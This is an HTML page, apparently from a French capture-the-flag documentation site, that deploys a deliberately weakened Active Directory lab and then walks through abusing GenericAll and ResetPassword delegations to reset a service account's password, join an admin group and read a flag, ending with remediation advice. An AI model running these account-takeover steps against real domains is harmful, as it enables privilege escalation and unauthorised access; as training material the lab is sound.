@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Flag 3 — ACL Active Directory dangereuses - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Flag 3 \u2014 ACL Active Directory dangereuses";
+        var mkdocs_page_input_path = "windows/Flag3-ACL-AD.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Crypto</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Flag 3 — ACL Active Directory dangereuses</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="flag-3-acl-active-directory-dangereuses">Flag 3 — ACL Active Directory dangereuses</h1>
+<blockquote>
+<p><strong>Technique :</strong> ACL Abuse — GenericAll + ResetPassword
+<strong>Machine de déploiement :</strong> DC01
+<strong>Machine d'exploitation :</strong> WS01 ou WS02
+<strong>Compte de départ :</strong> <code>CTF\helpdesk1</code> / <code>Helpdesk@1234</code>
+<strong>Difficulté :</strong> Intermédiaire</p>
+</blockquote>
+<hr />
+<h2 id="deploiement">Déploiement</h2>
+<h3 id="script-flag3-acl-adps1">Script — Flag3-ACL-AD.ps1</h3>
+<blockquote>
+<p>[!warning] Lancer en PowerShell Admin sur DC01</p>
+</blockquote>
+<pre><code class="language-powershell">#Requires -RunAsAdministrator
+Import-Module ActiveDirectory
+
+$DomainDN = &quot;DC=ctf,DC=local&quot;
+
+Write-Host &quot;`n[FLAG 3] ACL Active Directory dangereuses&quot; -ForegroundColor Cyan
+
+# --- 1. ACE : helpdesk1 -&gt; GenericAll sur LocalAdmins-WS01 ---
+$groupDN     = (Get-ADGroup -Identity &quot;LocalAdmins-WS01&quot;).DistinguishedName
+$helpdeskSID = (Get-ADUser  -Identity &quot;helpdesk1&quot;).SID
+
+$acl = Get-Acl -Path &quot;AD:\$groupDN&quot;
+$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $helpdeskSID,
+    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+    [System.Security.AccessControl.AccessControlType]::Allow
+)
+$acl.AddAccessRule($ace)
+Set-Acl -Path &quot;AD:\$groupDN&quot; -AclObject $acl
+Write-Host &quot;  [+] GenericAll : helpdesk1 -&gt; LocalAdmins-WS01&quot; -ForegroundColor Green
+
+# --- 2. ACE : helpdesk1 -&gt; ResetPassword sur svc-backup ---
+$svcDN     = (Get-ADUser -Identity &quot;svc-backup&quot;).DistinguishedName
+$resetGuid = [Guid]&quot;00299570-246d-11d0-a768-00aa006e0529&quot;
+
+$acl2 = Get-Acl -Path &quot;AD:\$svcDN&quot;
+$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $helpdeskSID,
+    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
+    [System.Security.AccessControl.AccessControlType]::Allow,
+    $resetGuid,
+    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+)
+$acl2.AddAccessRule($ace2)
+Set-Acl -Path &quot;AD:\$svcDN&quot; -AclObject $acl2
+Write-Host &quot;  [+] ResetPassword : helpdesk1 -&gt; svc-backup&quot; -ForegroundColor Green
+
+# --- 3. Share \\DC01\Backups ---
+# Deux niveaux de permissions :
+#   - Permissions SMB  -&gt; acces reseau
+#   - Permissions NTFS -&gt; acces dossier
+# Les deux doivent autoriser svc-backup
+
+$flagPath = &quot;C:\Shares\Backups&quot;
+New-Item -ItemType Directory -Path $flagPath -Force | Out-Null
+
+if (Get-SmbShare -Name &quot;Backups&quot; -ErrorAction SilentlyContinue) {
+    Remove-SmbShare -Name &quot;Backups&quot; -Force
+    Write-Host &quot;  [~] Ancien share Backups supprime&quot; -ForegroundColor Gray
+}
+
+# Creer le share
+New-SmbShare -Name &quot;Backups&quot; -Path $flagPath | Out-Null
+
+# Permissions SMB : autoriser svc-backup, revoquer Tout le monde via SID S-1-1-0
+Grant-SmbShareAccess -Name &quot;Backups&quot; -AccountName &quot;CTF\svc-backup&quot; `
+    -AccessRight Full -Force | Out-Null
+
+# Revoquer &quot;Tout le monde&quot; / &quot;Everyone&quot; via SID universel S-1-1-0
+# Compatible Windows FR et EN
+$everyoneSID = New-Object System.Security.Principal.SecurityIdentifier(&quot;S-1-1-0&quot;)
+$everyoneName = $everyoneSID.Translate([System.Security.Principal.NTAccount]).Value
+Revoke-SmbShareAccess -Name &quot;Backups&quot; -AccountName $everyoneName `
+    -Force -ErrorAction SilentlyContinue | Out-Null
+Write-Host &quot;  [+] Share SMB \\DC01\Backups : svc-backup=Full, Tout le monde=Revoque&quot; -ForegroundColor Green
+
+# Permissions NTFS via SIDs universels (compatible FR/EN)
+$aclShare = Get-Acl $flagPath
+$aclShare.SetAccessRuleProtection($true, $false)
+$aclShare.Access | ForEach-Object { $aclShare.RemoveAccessRule($_) | Out-Null }
+foreach ($sid in @(&quot;S-1-5-18&quot;, &quot;S-1-5-32-544&quot;)) {
+    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
+    $aclShare.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+        $s, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+}
+$aclShare.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+    &quot;CTF\svc-backup&quot;, &quot;FullControl&quot;, &quot;ContainerInherit,ObjectInherit&quot;, &quot;None&quot;, &quot;Allow&quot;)))
+Set-Acl -Path $flagPath -AclObject $aclShare
+Write-Host &quot;  [+] ACL NTFS : svc-backup FullControl&quot; -ForegroundColor Green
+
+Set-Content &quot;$flagPath\flag3.txt&quot; -Value &quot;FLAG{ad_acl_delegation_abuse}&quot; -Encoding UTF8
+Write-Host &quot;  [+] flag3.txt cree dans $flagPath&quot; -ForegroundColor Green
+
+# --- 4. Verifications ---
+Write-Host &quot;`n  [*] ACL groupe LocalAdmins-WS01 :&quot; -ForegroundColor Yellow
+(Get-Acl &quot;AD:\$groupDN&quot;).Access |
+    Where-Object { $_.IdentityReference -match &quot;helpdesk&quot; } |
+    Select-Object IdentityReference, ActiveDirectoryRights
+
+Write-Host &quot;`n  [*] ACL svc-backup :&quot; -ForegroundColor Yellow
+(Get-Acl &quot;AD:\$svcDN&quot;).Access |
+    Where-Object { $_.IdentityReference -match &quot;helpdesk&quot; } |
+    Select-Object IdentityReference, ActiveDirectoryRights
+
+Write-Host &quot;`n  [*] Permissions SMB :&quot; -ForegroundColor Yellow
+Get-SmbShareAccess -Name &quot;Backups&quot;
+
+Write-Host &quot;`n  [*] Permissions NTFS :&quot; -ForegroundColor Yellow
+icacls $flagPath
+
+Write-Host &quot;`n  [*] Flag :&quot; -ForegroundColor Yellow
+Get-Content &quot;$flagPath\flag3.txt&quot;
+
+Write-Host &quot;`n[FLAG 3] DONE&quot; -ForegroundColor Green
+Write-Host &quot;  SNAPSHOT : DC01 - Flag3 deploye&quot; -ForegroundColor Yellow
+</code></pre>
+<hr />
+<h3 id="verification-du-deploiement">Vérification du déploiement</h3>
+<blockquote>
+<p>[!warning] Depuis PowerShell Admin sur DC01</p>
+</blockquote>
+<pre><code class="language-powershell"># Permissions SMB
+Get-SmbShareAccess -Name &quot;Backups&quot;
+# Attendu :
+#   CTF\svc-backup  Allow  Full
+#   (Tout le monde absent)
+
+# Permissions NTFS
+icacls C:\Shares\Backups
+# Attendu :
+#   CTF\svc-backup:(OI)(CI)(F)
+#   AUTORITE NT\Systeme:(OI)(CI)(F)
+#   BUILTIN\Administrateurs:(OI)(CI)(F)
+
+# Flag
+Get-Content &quot;C:\Shares\Backups\flag3.txt&quot;
+# Attendu : FLAG{ad_acl_delegation_abuse}
+</code></pre>
+<blockquote>
+<p>[!success] Snapshot DC01
+<strong><code>DC01 — Flag3 déployé</code></strong></p>
+</blockquote>
+<hr />
+<h2 id="write-up">Write-up</h2>
+<h3 id="contexte">Contexte</h3>
+<p>Le compte <code>helpdesk1</code> possède deux droits dangereux sur des objets Active Directory, mal configurés lors d'une délégation helpdesk. Ces droits permettent de prendre le contrôle de comptes et de groupes sans être administrateur du domaine :</p>
+<ul>
+<li><code>GenericAll</code> sur le groupe <code>LocalAdmins-WS01</code> → peut y ajouter n'importe quel membre</li>
+<li><code>ResetPassword</code> sur le compte <code>svc-backup</code> → peut changer son mot de passe sans connaître l'ancien</li>
+</ul>
+<p>Le compte <code>svc-backup</code> est le seul à pouvoir accéder au share <code>\\DC01\Backups</code> qui contient le flag.</p>
+<hr />
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="etape-1-enumerer-les-acl-ad-avec-les-outils-natifs">Étape 1 — Énumérer les ACL AD avec les outils natifs</h4>
+<p>Connecté en <code>CTF\helpdesk1</code> sur WS01, ouvrir PowerShell :</p>
+<pre><code class="language-powershell"># Verifier les droits sur le groupe LocalAdmins-WS01
+$groupDN = (Get-ADGroup -Identity &quot;LocalAdmins-WS01&quot;).DistinguishedName
+(Get-Acl &quot;AD:\$groupDN&quot;).Access |
+    Where-Object { $_.IdentityReference -match &quot;helpdesk1&quot; } |
+    Select-Object IdentityReference, ActiveDirectoryRights
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>IdentityReference  ActiveDirectoryRights
+-----------------  ---------------------
+CTF\helpdesk1      GenericAll
+</code></pre>
+<pre><code class="language-powershell"># Verifier les droits sur svc-backup
+$svcDN = (Get-ADUser -Identity &quot;svc-backup&quot;).DistinguishedName
+(Get-Acl &quot;AD:\$svcDN&quot;).Access |
+    Where-Object { $_.IdentityReference -match &quot;helpdesk1&quot; } |
+    Select-Object IdentityReference, ActiveDirectoryRights
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>IdentityReference  ActiveDirectoryRights
+-----------------  ---------------------
+CTF\helpdesk1      ExtendedRight
+</code></pre>
+<p><code>ExtendedRight</code> avec le GUID <code>00299570-246d-11d0-a768-00aa006e0529</code> correspond au droit <code>ResetPassword</code>.</p>
+<h4 id="etape-2-identifier-le-share-cible">Étape 2 — Identifier le share cible</h4>
+<pre><code class="language-powershell">net view \\DC01
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Ressources partagées sur \\DC01
+
+Nom du partage  Type  Commentaire
+-----------------------------------------------------------------
+Backups         Disque
+NETLOGON        Disque
+SYSVOL          Disque
+</code></pre>
+<p>Le share <code>Backups</code> est visible. On tente d'y accéder directement avec <code>helpdesk1</code> :</p>
+<pre><code class="language-powershell">net use B: \\DC01\Backups
+# Résultat : Erreur système 5 — Accès refusé
+</code></pre>
+<p>Le share n'est accessible que par <code>svc-backup</code>. Il faut trouver un moyen d'obtenir ses credentials.</p>
+<hr />
+<h3 id="exploitation-voie-a-resetpassword-sur-svc-backup">Exploitation — Voie A : ResetPassword sur svc-backup</h3>
+<p>C'est le chemin le plus direct vers le flag.</p>
+<h4 id="etape-3-reinitialiser-le-mot-de-passe-de-svc-backup">Étape 3 — Réinitialiser le mot de passe de svc-backup</h4>
+<pre><code class="language-powershell">$newPwd = ConvertTo-SecureString &quot;Hacked@99!&quot; -AsPlainText -Force
+Set-ADAccountPassword -Identity &quot;svc-backup&quot; -NewPassword $newPwd -Reset
+Write-Host &quot;Mot de passe de svc-backup reinitialise : Hacked@99!&quot;
+</code></pre>
+<h4 id="etape-4-acceder-au-share-et-lire-le-flag">Étape 4 — Accéder au share et lire le flag</h4>
+<pre><code class="language-powershell">net use B: \\DC01\Backups /user:CTF\svc-backup Hacked@99!
+Get-Content B:\flag3.txt
+net use B: /delete
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{ad_acl_delegation_abuse}
+</code></pre>
+<hr />
+<h3 id="exploitation-voie-b-genericall-sur-localadmins-ws01">Exploitation — Voie B : GenericAll sur LocalAdmins-WS01</h3>
+<p>Cette voie donne les droits admin locaux sur WS01.</p>
+<h4 id="etape-3-sajouter-au-groupe-localadmins-ws01">Étape 3 — S'ajouter au groupe LocalAdmins-WS01</h4>
+<pre><code class="language-powershell">Add-ADGroupMember -Identity &quot;LocalAdmins-WS01&quot; -Members &quot;helpdesk1&quot;
+</code></pre>
+<h4 id="etape-4-verifier-lajout">Étape 4 — Vérifier l'ajout</h4>
+<pre><code class="language-powershell">Get-ADGroupMember -Identity &quot;LocalAdmins-WS01&quot; | Select-Object Name
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>Name
+----
+svc-web
+helpdesk1
+</code></pre>
+<h4 id="etape-5-obtenir-un-nouveau-token">Étape 5 — Obtenir un nouveau token</h4>
+<p>Se déconnecter et se reconnecter avec <code>helpdesk1</code>. Le compte est maintenant admin local sur WS01.</p>
+<hr />
+<h3 id="recuperation-du-flag">Récupération du flag</h3>
+<pre><code class="language-powershell">Get-Content B:\flag3.txt
+</code></pre>
+<p><strong>Résultat :</strong></p>
+<pre><code>FLAG{ad_acl_delegation_abuse}
+</code></pre>
+<hr />
+<h3 id="aller-plus-loin">Aller plus loin</h3>
+<pre><code class="language-powershell"># Ajouter lowpriv au groupe admin local
+Add-ADGroupMember -Identity &quot;LocalAdmins-WS01&quot; -Members &quot;lowpriv&quot;
+
+# Pivoter vers d'autres ressources de svc-backup
+net use B: \\DC01\Backups /user:CTF\svc-backup Hacked@99!
+</code></pre>
+<hr />
+<h3 id="remediation">Remédiation</h3>
+<table>
+<thead>
+<tr>
+<th>Problème</th>
+<th>Correction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GenericAll</code> accordé à helpdesk1</td>
+<td>Remplacer par des droits granulaires — uniquement <code>WriteMembers</code> si nécessaire</td>
+</tr>
+<tr>
+<td><code>ResetPassword</code> accordé à helpdesk1</td>
+<td>Déléguer uniquement aux comptes qui en ont un besoin opérationnel réel</td>
+</tr>
+<tr>
+<td>Pas d'audit des ACL</td>
+<td>Auditer régulièrement avec BloodHound ou <code>Get-ObjectAcl</code></td>
+</tr>
+<tr>
+<td>Pas d'alerting</td>
+<td>Alertes sur les modifications de membres de groupes sensibles</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="resume-de-la-chaine-dexploitation">Résumé de la chaîne d'exploitation</h3>
+<pre><code>helpdesk1
+  └─→ Get-Acl AD:\LocalAdmins-WS01 → GenericAll sur le groupe
+  │     └─→ Add-ADGroupMember → helpdesk1 admin local WS01
+  │
+  └─→ Get-Acl AD:\svc-backup → ExtendedRight (ResetPassword)  ← chemin direct
+        └─→ Set-ADAccountPassword → nouveau mot de passe svc-backup
+              └─→ net use \\DC01\Backups /user:CTF\svc-backup Hacked@99!
+                    └─→ FLAG{ad_acl_delegation_abuse}
+</code></pre>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
